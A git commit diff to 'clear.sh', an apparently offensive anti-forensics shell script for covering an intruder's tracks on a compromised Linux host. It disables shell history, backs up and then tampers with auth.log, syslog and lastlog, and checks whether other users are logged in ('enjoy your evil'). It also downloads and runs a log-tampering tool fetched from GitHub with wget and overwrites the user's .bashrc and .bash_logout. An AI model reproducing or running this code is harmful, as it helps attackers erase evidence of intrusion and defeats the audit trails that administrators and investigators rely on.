a54cdf20c3e0211cd2373ebe838b4a0993665445
root <root@localhost.localdomain>
2019-03-27 22:48:07 -0400

    ok

--- clear.sh
+++ clear.sh
@@ -19,6 +19,26 @@ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
 export HISTFILE=/dev/null;
 export HISTSIZE=0;
 export HISTFILESIZE=0;
+REST="\e[0m"
+UNDERLINE="\e[4m"
+ColorDefault="\e[39m"
+ColorBlack="\e[30m"
+ColorRed="\e[31m"
+ColorGreen="\e[32m"
+ColorYellow="\e[33m"
+ColorBlue="\e[34m"
+ColorMagenta="\e[35m"
+ColorCyan="\e[36m"
+ColorLightGray="\e[37m"
+ColorDarkGray="\e[90m"
+ColorLightRed="\e[91m"
+ColorLightGreen="\e[92m"
+ColorLightYellow="\e[93m"
+ColorLightBlue="\e[94m"
+ColorLightMagenta="\e[95m"
+ColorLightCyan="\e[96m"
+ColorWhite="\e[97m"
+
 
 my_name="$(whoami)"
 my_pts="$(who am i| awk '{print $2}' | xargs)"
@@ -36,12 +56,24 @@ function _resume {
   eval $(cat $index_f | awk  -F "'" '{ print "cp -v ", $4, $2 }' )
 }
 
-echo "collection info for clear"
+function glog {
+    echo "${ColorLightGreen}[!]${REST} ${ColorLightBlue}$* ${REST}"
+}
+glog "collection info for clear"
+
 last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips
+if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then
+    glog "warnning user is logined in !!!! , so exit ";
+    ByeHack;
+else
+    glog ${UNDERLINE}" safe ! -- enjoy your evil "
+fi
+
 _bak /var/log/auth.log;
 _bak /var/log/syslog;
 _bak /var/log/lastlog;
 
+echo "${ColorLightGreen}[Good]${REST} ${ColorLightCyan} ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"
 
 function CL {
     wget --no-check-certificate  -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
@@ -54,8 +86,8 @@ function CL {
 }
 
 function ByeHack {
-  cp /tmp/_bash ~/
-  cp /tmp/_bash_out ~/
+  mv /tmp/_bash ~/.bashrc
+  mv /tmp/_bash_out ~/.bash_logout
   CL
   _resume;
 }
